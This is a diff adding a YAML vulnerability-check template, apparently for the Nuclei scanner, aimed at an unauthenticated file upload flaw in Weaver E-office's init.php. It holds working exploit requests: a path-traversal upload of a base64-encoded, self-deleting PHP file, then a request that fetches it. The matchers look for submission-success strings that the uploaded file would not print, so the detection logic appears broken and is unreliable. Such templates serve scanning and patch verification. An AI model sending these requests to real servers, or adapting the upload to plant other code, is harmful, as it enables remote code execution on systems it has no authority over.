@@ -1,0 +1,33 @@
+id: weaver-e-office-init-upload2
+
+info:
+  name: 泛微 E-office init.php 组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过 init.php 接口可实现未经验证的文件上传操作
+      影响组件: E-office 系统初始化处理模块
+      漏洞类型: 不安全的文件上传机制
+      风险等级: 高危（可导致远程代码执行）
+      技术特征: 文件上传路径未进行有效校验与过滤
+  tags: 泛微
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../NTest.php HTTP/1.1
+    Host: {{Hostname}}
+- raw:
+  - |
+    GET /attachment/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '提交成功'
+    - '新建成功'
